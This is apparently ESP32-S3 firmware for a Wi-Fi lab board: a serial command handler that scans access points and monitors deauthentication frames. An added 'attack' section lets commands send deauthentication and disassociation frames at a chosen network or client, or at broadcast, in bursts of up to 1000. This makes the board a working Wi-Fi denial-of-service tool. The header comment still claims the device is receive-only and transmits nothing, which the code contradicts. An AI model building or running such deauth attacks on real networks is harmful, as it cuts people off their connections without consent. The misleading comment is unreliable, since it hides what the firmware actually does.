#include "WiFiScan.h"

/* Safe lab endpoint. The deauth monitor is receive-only: promiscuous mode is
 * filtered to management frames and no raw transmit API is used. */
static char inputLine[96];
static size_t inputLength;
static char usbInputLine[96];
static size_t usbInputLength;
static int scanCount;
static const int maxReportedAps = 32;
static uint32_t rxBytes;
static uint32_t commandCount;
static uint32_t lastHeartbeat;
static uint32_t lastUartByteAt;
static uint32_t lastMonitorLog;
static uint32_t lastAttackLog;
static WiFiScan wifiScan;

static void logPrefix(const char* level) {
  Serial.print('[');
  Serial.print(millis());
  Serial.print("] [");
  Serial.print(level);
  Serial.print("] ");
}

static void logLine(const char* level, const char* message) {
  logPrefix(level);
  Serial.println(message);
}

static void sendLine(const char* response) {
  Serial1.println(response);
  logPrefix("TX");
  Serial.println(response);
}

static void logRxByte(uint8_t value) {
  if (rxBytes == 65) {
    logLine("RX BYTE", "Further raw-byte logs suppressed; counters remain active");
  }
  if (rxBytes > 64) return;
  logPrefix("RX BYTE");
  Serial.print("0x");
  if (value < 0x10) Serial.print('0');
  Serial.print(value, HEX);
  if (value >= 32 && value <= 126) {
    Serial.print(" '");
    Serial.write(value);
    Serial.print("'");
  }
  Serial.println();
}

static void printSafe(const char* text) {
  while (*text) {
    char c = *text++;
    Serial1.write((c == '|' || c == '\r' || c == '\n') ? '_' : c);
  }
}

static bool validUnsigned(const char* text) {
  if (!*text) return false;
  while (*text) {
    if (*text < '0' || *text > '9') return false;
    ++text;
  }
  return true;
}

static void printMac(const uint8_t* mac) {
  int i;
  for (i = 0; i < 6; ++i) {
    if (mac[i] < 0x10) Serial.print('0');
    Serial.print(mac[i], HEX);
    if (i < 5) Serial.print(':');
  }
}

static void stopDeauthMonitor() {
  if (!wifiScan.monitoring()) return;
  WiFiScan::MonitorState state = wifiScan.monitorState();
  wifiScan.stopMonitor();
  logPrefix("DEAUTH MON");
  Serial.print("Stopped deauth="); Serial.print(state.deauthFrames);
  Serial.print(" disassoc="); Serial.println(state.disassocFrames);
}

static bool startDeauthMonitor(const char* bssid, int channel) {
  lastMonitorLog = millis();
  if (!wifiScan.startMonitor(bssid, (uint8_t)channel)) return false;
  logPrefix("DEAUTH MON");
  Serial.print("Receive-only monitor BSSID="); Serial.print(bssid);
  Serial.print(" CH="); Serial.println(channel);
  return true;
}

// ============ NUEVAS FUNCIONES DE ATAQUE ============

static void stopAttack() {
  if (!wifiScan.attackRunning()) return;
  WiFiScan::AttackStats stats = wifiScan.getAttackStats();
  wifiScan.stopAttack();
  logPrefix("ATTACK");
  Serial.print("Stopped attack - deauth="); Serial.print(stats.deauthSent);
  Serial.print(" disassoc="); Serial.println(stats.disassocSent);
}

static bool startAttack(const char* bssid, int channel, const char* clientMac = nullptr) {
  lastAttackLog = millis();
  if (!wifiScan.startAttack(bssid, (uint8_t)channel, clientMac)) return false;
  logPrefix("ATTACK");
  Serial.print("Started deauth attack BSSID="); Serial.print(bssid);
  Serial.print(" CH="); Serial.print(channel);
  if (clientMac) {
    Serial.print(" client="); Serial.print(clientMac);
  } else {
    Serial.print(" target=broadcast");
  }
  Serial.println();
  return true;
}

static void sendAttackPacket(int type, uint16_t reasonCode = 7) {
  if (!wifiScan.attackRunning()) {
    sendLine("ERR 30 ATTACK_NOT_RUNNING");
    return;
  }
  
  bool success;
  if (type == 0) { // DEAUTH
    success = wifiScan.sendDeauth(reasonCode);
  } else { // DISASSOC
    success = wifiScan.sendDisassoc(reasonCode);
  }
  
  if (success) {
    WiFiScan::AttackStats stats = wifiScan.getAttackStats();
    char response[64];
    snprintf(response, sizeof(response), "ATTACK_SENT deauth=%d disassoc=%d", 
             stats.deauthSent, stats.disassocSent);
    sendLine(response);
  } else {
    sendLine("ERR 31 SEND_FAILED");
  }
}

static void sendBurstAttack(int count, int type = 0, uint16_t reasonCode = 7) {
  if (!wifiScan.attackRunning()) {
    sendLine("ERR 30 ATTACK_NOT_RUNNING");
    return;
  }
  
  wifiScan.sendBurstDeauth(count, reasonCode);
  WiFiScan::AttackStats stats = wifiScan.getAttackStats();
  char response[64];
  snprintf(response, sizeof(response), "BURST_SENT count=%d deauth=%d disassoc=%d", 
           count, stats.deauthSent, stats.disassocSent);
  sendLine(response);
}

static uint32_t displayCount(uint32_t value) {
  return value > 9999 ? 9999 : value;
}

static void handleScan() {
  int i;
  int reportedCount;
  uint32_t startedAt = millis();

  stopDeauthMonitor();
  stopAttack();
  /* Confirm receipt before the blocking radio scan starts. */
  sendLine("OK");
  Serial1.flush();
  logLine("SCAN", "Starting WiFi scan");
  scanCount = wifiScan.scan();
  if (scanCount < 0) {
    sendLine("ERR 10 SCAN_FAILED");
    logLine("ERROR", "WiFi.scanNetworks failed");
    scanCount = 0;
    return;
  }
  logPrefix("SCAN");
  Serial.print("Found ");
  Serial.print(scanCount);
  Serial.print(" AP(s) in ");
  Serial.print(millis() - startedAt);
  Serial.println(" ms");
  reportedCount = scanCount < maxReportedAps ? scanCount : maxReportedAps;
  if (scanCount > reportedCount) {
    logPrefix("SCAN");
    Serial.print("Limiting UART response to ");
    Serial.print(reportedCount);
    Serial.println(" AP(s)");
  }
  for (i = 0; i < reportedCount; ++i) {
    Serial1.print("AP "); Serial1.print(i); Serial1.write('|');
    printSafe(wifiScan.ssid(i).c_str()); Serial1.write('|');
    Serial1.print(wifiScan.bssid(i)); Serial1.write('|');
    Serial1.print(wifiScan.channel(i)); Serial1.write('|');
    Serial1.println(wifiScan.rssi(i));

    logPrefix("TX AP");
    Serial.print(i); Serial.print(" SSID="); Serial.print(wifiScan.ssid(i));
    Serial.print(" BSSID="); Serial.print(wifiScan.bssid(i));
    Serial.print(" CH="); Serial.print(wifiScan.channel(i));
    Serial.print(" RSSI="); Serial.println(wifiScan.rssi(i));
  }
  Serial1.print("SCAN_DONE "); Serial1.println(reportedCount);
  logPrefix("TX"); Serial.print("SCAN_DONE "); Serial.println(reportedCount);
  Serial1.flush();
  wifiScan.clearScan();
}

static void handleCommand(char* line) {
  ++commandCount;
  logPrefix("RX CMD");
  Serial.println(line);
  if (!strcmp(line, "SCAN")) {
    handleScan();
  } else if (!strcmp(line, "PING")) {
    sendLine("PONG");
  } else if (!strcmp(line, "STOP")) {
    stopDeauthMonitor();
    stopAttack();
    sendLine("STATUS STOPPED");
  } else if (!strcmp(line, "DEAUTH_STATUS")) {
    WiFiScan::MonitorState state = wifiScan.monitorState();
    Serial1.print("MONITOR ");
    Serial1.print(displayCount(state.deauthFrames));
    Serial1.write('|');
    Serial1.println(displayCount(state.disassocFrames));
    logPrefix("TX");
    Serial.print("MONITOR "); Serial.print(state.deauthFrames);
    Serial.write('|'); Serial.println(state.disassocFrames);
  } else if (!strncmp(line, "SELECT ", 7)) {
    const char* indexText = line + 7;
    int index;
    if (!validUnsigned(indexText)) { sendLine("ERR 20 BAD_INDEX"); return; }
    index = atoi(indexText);
    if (index < 0 || index >= scanCount) sendLine("ERR 21 INDEX_RANGE");
    else sendLine("OK");
  } else if (!strncmp(line, "DEAUTH_SCAN ", 12)) {
    char* bssid = line + 12;
    char* separator = strrchr(bssid, ' ');
    int channel;
    if (!separator || !validUnsigned(separator + 1)) {
      sendLine("STATUS ERROR");
      return;
    }
    *separator = '\0';
    channel = atoi(separator + 1);
    sendLine("STATUS READY");
    if (startDeauthMonitor(bssid, channel)) sendLine("STATUS RUNNING");
    else sendLine("STATUS ERROR");
  } else if (!strncmp(line, "SIM_DEAUTH ", 11)) {
    char* bssidText = line + 11;
    char* separator = strrchr(bssidText, ' ');
    int channel;
    if (!separator || !validUnsigned(separator + 1)) {
      sendLine("STATUS ERROR");
      return;
    }
    *separator = '\0';
    channel = atoi(separator + 1);
    if (channel < 1 || channel > 14) {
      sendLine("STATUS ERROR");
      return;
    }
    sendLine("STATUS READY");
    if (wifiScan.startMonitor(bssidText, (uint8_t)channel)) sendLine("STATUS RUNNING");
    else sendLine("STATUS ERROR");
  // ============ NUEVOS COMANDOS DE ATAQUE ============
  } else if (!strncmp(line, "ATTACK_START ", 13)) {
    // Formato: ATTACK_START <BSSID> <CHANNEL> [CLIENT_MAC]
    char* params = line + 13;
    char* bssid = params;
    char* separator = strchr(bssid, ' ');
    if (!separator) {
      sendLine("ERR 40 BAD_PARAMS");
      return;
    }
    *separator = '\0';
    char* channelStr = separator + 1;
    char* clientMac = nullptr;
    
    // Buscar un segundo espacio para cliente opcional
    char* secondSeparator = strchr(channelStr, ' ');
    if (secondSeparator) {
      *secondSeparator = '\0';
      clientMac = secondSeparator + 1;
    }
    
    if (!validUnsigned(channelStr)) {
      sendLine("ERR 40 BAD_PARAMS");
      return;
    }
    
    int channel = atoi(channelStr);
    if (channel < 1 || channel > 14) {
      sendLine("ERR 41 INVALID_CHANNEL");
      return;
    }
    
    sendLine("STATUS READY");
    if (startAttack(bssid, channel, clientMac)) {
      sendLine("STATUS ATTACK_RUNNING");
    } else {
      sendLine("STATUS ERROR");
    }
    
  } else if (!strncmp(line, "ATTACK_SEND ", 12)) {
    // Formato: ATTACK_SEND <TYPE> [REASON_CODE]
    char* params = line + 12;
    char* typeStr = params;
    char* separator = strchr(typeStr, ' ');
    int type = 0;
    uint16_t reasonCode = 7;
    
    if (separator) {
      *separator = '\0';
      if (validUnsigned(separator + 1)) {
        reasonCode = (uint16_t)atoi(separator + 1);
      }
    }
    
    if (!validUnsigned(typeStr)) {
      sendLine("ERR 40 BAD_PARAMS");
      return;
    }
    type = atoi(typeStr);
    if (type != 0 && type != 1) {
      sendLine("ERR 42 INVALID_TYPE");
      return;
    }
    
    sendAttackPacket(type, reasonCode);
    
  } else if (!strncmp(line, "ATTACK_BURST ", 13)) {
    // Formato: ATTACK_BURST <COUNT> [TYPE] [REASON_CODE]
    char* params = line + 13;
    char* countStr = params;
    char* separator = strchr(countStr, ' ');
    int count = 10;
    int type = 0;
    uint16_t reasonCode = 7;
    
    if (!validUnsigned(countStr)) {
      sendLine("ERR 40 BAD_PARAMS");
      return;
    }
    count = atoi(countStr);
    if (count < 1 || count > 1000) {
      sendLine("ERR 43 INVALID_COUNT");
      return;
    }
    
    if (separator) {
      *separator = '\0';
      char* nextParam = separator + 1;
      char* nextSeparator = strchr(nextParam, ' ');
      if (validUnsigned(nextParam)) {
        type = atoi(nextParam);
        if (type != 0 && type != 1) {
          sendLine("ERR 42 INVALID_TYPE");
          return;
        }
        if (nextSeparator) {
          *nextSeparator = '\0';
          if (validUnsigned(nextSeparator + 1)) {
            reasonCode = (uint16_t)atoi(nextSeparator + 1);
          }
        }
      } else {
        sendLine("ERR 40 BAD_PARAMS");
        return;
      }
    }
    
    sendBurstAttack(count, type, reasonCode);
    
  } else if (!strncmp(line, "ATTACK_STOP", 11)) {
    stopAttack();
    sendLine("ATTACK_STOPPED");
    
  } else if (!strncmp(line, "ATTACK_STATUS", 13)) {
    if (wifiScan.attackRunning()) {
      WiFiScan::AttackStats stats = wifiScan.getAttackStats();
      char response[64];
      snprintf(response, sizeof(response), "ATTACK_ACTIVE deauth=%d disassoc=%d",
               stats.deauthSent, stats.disassocSent);
      sendLine(response);
    } else {
      sendLine("ATTACK_INACTIVE");
    }
    
  } else {
    sendLine("ERR 1 UNKNOWN_COMMAND");
  }
}

void setup() {
  Serial.begin(115200);
  delay(250);
  /* XIAO ESP32-S3 D6=TX/GPIO43 and D7=RX/GPIO44 by default. Adjust to wiring. */
  /* UART idle is HIGH. This prevents a disconnected RP2040 TX from floating. */
  pinMode(D7, INPUT_PULLUP);
  Serial1.begin(115200, SERIAL_8N1, D7, D6);
  inputLength = 0;
  usbInputLength = 0;
  scanCount = 0;
  rxBytes = 0;
  commandCount = 0;
  lastHeartbeat = millis();
  lastUartByteAt = 0;
  lastMonitorLog = 0;
  lastAttackLog = 0;
  wifiScan.begin();

  logLine("BOOT", "PM WiFi Lab ESP32-S3 starting with Attack capabilities");
  logLine("UART", "Serial1 115200 8N1 RX=D7/GPIO44 TX=D6/GPIO43");
  logLine("READY", "Waiting for RP2040 commands; USB console accepts PING or SCAN");
}

void loop() {
  while (Serial1.available()) {
    char c = (char)Serial1.read();
    ++rxBytes;
    lastUartByteAt = millis();
    logRxByte((uint8_t)c);
    if (c == '\r') continue;
    if (c == '\n') {
      inputLine[inputLength] = '\0';
      if (inputLength) handleCommand(inputLine);
      inputLength = 0;
    } else if ((uint8_t)c < 32 || (uint8_t)c > 126) {
      /* The protocol is printable ASCII. Drop binary noise immediately so it
       * cannot prefix and corrupt the next real command. */
      inputLength = 0;
    } else if (inputLength + 1 < sizeof(inputLine)) {
      inputLine[inputLength++] = c;
    } else {
      inputLength = 0;
      sendLine("ERR 2 LINE_TOO_LONG");
      logLine("ERROR", "UART input line exceeded 95 bytes");
    }
  }

  /* A truncated/noisy line must not survive until a later valid command. */
  if (inputLength && millis() - lastUartByteAt > 250) {
    logLine("UART", "Discarding incomplete line after 250 ms idle");
    inputLength = 0;
  }

  /* USB diagnostic console: type PING or SCAN in Serial Monitor using a
   * newline ending to test the ESP32 without depending on the RP2040. */
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\r') continue;
    if (c == '\n') {
      usbInputLine[usbInputLength] = '\0';
      if (usbInputLength) {
        logPrefix("USB CMD"); Serial.println(usbInputLine);
        handleCommand(usbInputLine);
      }
      usbInputLength = 0;
    } else if (usbInputLength + 1 < sizeof(usbInputLine)) {
      usbInputLine[usbInputLength++] = c;
    } else {
      usbInputLength = 0;
      logLine("ERROR", "USB command exceeded 95 bytes");
    }
  }

  if (millis() - lastHeartbeat >= 5000) {
    lastHeartbeat = millis();
    logPrefix("ALIVE");
    Serial.print("uptime="); Serial.print(lastHeartbeat);
    Serial.print("ms rx_bytes="); Serial.print(rxBytes);
    Serial.print(" commands="); Serial.println(commandCount);
  }

  if (wifiScan.monitoring() && millis() - lastMonitorLog >= 1000) {
    WiFiScan::MonitorState state = wifiScan.monitorState();
    lastMonitorLog = millis();
    logPrefix("DEAUTH MON");
    Serial.print("CH="); Serial.print(wifiScan.monitorChannel());
    Serial.print(" deauth="); Serial.print(state.deauthFrames);
    Serial.print(" disassoc="); Serial.print(state.disassocFrames);
    if (state.subtype) {
      Serial.print(" last=");
      Serial.print(state.subtype == 0xc0 ? "DEAUTH" : "DISASSOC");
      Serial.print(" rssi="); Serial.print((int)state.rssi);
      Serial.print(" ch="); Serial.print(state.channel);
      Serial.print(" src="); printMac(state.source);
      Serial.print(" dst="); printMac(state.destination);
    }
    Serial.println();
  }

  // Log de estado de ataque
  if (wifiScan.attackRunning() && millis() - lastAttackLog >= 2000) {
    lastAttackLog = millis();
    WiFiScan::AttackStats stats = wifiScan.getAttackStats();
    logPrefix("ATTACK");
    Serial.print("deauth_sent="); Serial.print(stats.deauthSent);
    Serial.print(" disassoc_sent="); Serial.println(stats.disassocSent);
  }
}